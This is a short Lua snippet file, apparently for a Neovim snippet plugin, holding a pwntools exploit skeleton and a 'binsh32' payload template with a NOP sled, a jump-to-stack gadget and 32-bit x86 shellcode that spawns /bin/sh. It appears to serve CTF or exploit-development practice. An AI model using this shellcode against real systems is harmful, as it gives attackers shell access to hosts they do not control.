---@diagnostic disable: undefined-global

return {
	s(
		"pwn",
		fmt(
			[[
from pwn import *

def setup():
  if args.REMOTE and args.PORT:
    return (remote(args.REMOTE, args.PORT), None, None)
  exe = "./" + args.EXE
  return (process(exe), ELF(exe), ROP(ELF(exe)))

p, elf, rop = setup()

{}
      ]],
			{ i(1) }
		)
	),
	s(
		"binsh32",
		fmt(
			[[
payload = b"\x90" * offset
payload += b"\xff\xe4"
payload += jmp_eax
payload += b"\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
      ]],
			{}
		)
	),
}
